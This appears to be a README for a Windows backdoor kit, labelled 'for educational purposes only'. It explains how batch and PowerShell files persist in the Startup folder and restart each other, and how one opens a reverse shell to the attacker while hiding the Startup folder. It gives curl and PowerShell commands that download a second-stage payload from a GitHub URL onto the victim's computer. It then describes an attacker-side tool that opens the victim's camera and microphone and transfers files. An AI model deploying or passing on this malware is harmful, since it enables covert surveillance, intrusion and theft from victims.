The following files are for educational purposes only.

First, you download the file batmobile.bat on the client-side. If it doesn’t exist in the Startup folder, it will copy itself there and restart the computer. Afterward, it checks if the file shackmobile.ps1 exists in the Startup folder. If not, it will write the content to a file in the Startup folder, save it as shackmobile.ps1, and restart the computer. Then, it checks if the file monitor.bat exists in the Startup folder, and if not, it will write the content to a file in the Startup folder, save it as monitor.bat, and restart the computer.

If the files batmobile.bat, shackmobile.ps1, and monitor.bat are already present in the Startup folder, the file batmobile.bat will execute them in a hidden window.

*Batmobile.bat during execution:*

Runs the files monitor.bat and shackmobile.ps1 in a hidden window and monitors if their windows are closed or killed. If so, it will restart them.

*Monitor.bat during execution:*

Checks if the file batmobile.bat is running. If it’s killed or its window is closed, it will restart it.

*Shackmobile.ps1 during execution:*

Performs a reverse shell to the attacker's IP address and port specified in the code. Additionally, it checks if someone tries to open the Startup folder, and if so, it closes it immediately.

-----------------------------------

After communication is established between the attacker and the victim, we want to enable the ability to open the victim's camera, open the victim's microphone, upload files easily to the victim’s computer, and even download files from the victim’s computer.

Therefore, we will download the file maverick.bat to the victim's computer using the following command:

*CMD:*

bash
curl -L -o maverick.bat https://raw.githubusercontent.com/glitch422/Windows-BackDoor/main/Victem/maverick.bat


*Powershell:*

powershell
Invoke-WebRequest -Url "https://raw.githubusercontent.com/glitch422/Windows-BackDoor/main/Victem/maverick.bat" -OutFile "maverick.bat"


*Maverick.bat during execution:*
The file checks if it is located in the Startup folder, and if not, it copies itself there and restarts the computer.

If it is indeed found in the Startup folder, it will begin performing the following actions:

*Step 1:* It checks if python3 is installed on the computer. If not, it checks if a file named python.bat exists in the Startup folder. If the file does not exist, it will write the content into a file in the Startup folder, save it as python.bat, and run the file to download the latest version of Python to the victim’s computer. If python3 is installed, the code proceeds to the next check.

*Step 2:* The code checks if ffmpeg (a Python library) is installed, which provides tools for media processing. If ffmpeg is not installed on the computer, the code checks if ffmpeg.bat exists in the Startup folder. If the file does not exist, it will write the content into a file in the Startup folder, save it as ffmpeg.bat, and run the file to install ffmpeg on the computer.

*Note:* Without python3 and ffmpeg, the script smile.ps1 cannot run.

Additionally, on the server-side (the attacker’s machine), python3 and ffmpeg need to be installed in order to run topgun.py.

*Step 3:* The code checks if the file smile.ps1 exists in the Startup folder. If not, it writes the content into a file and saves it as smile.ps1. Afterward, it runs the file.

On the attacker's side, you will need to install ffmpeg and python3 and set up topgun.py.

*Topgun.py:*
- It will give you the option to open the victim’s camera and view its feed.
- It will give you the option to open the victim’s microphone and hear the audio.
- It allows you to upload files to the victim’s computer from your own.
- It allows you to download files from the victim’s computer to your own.
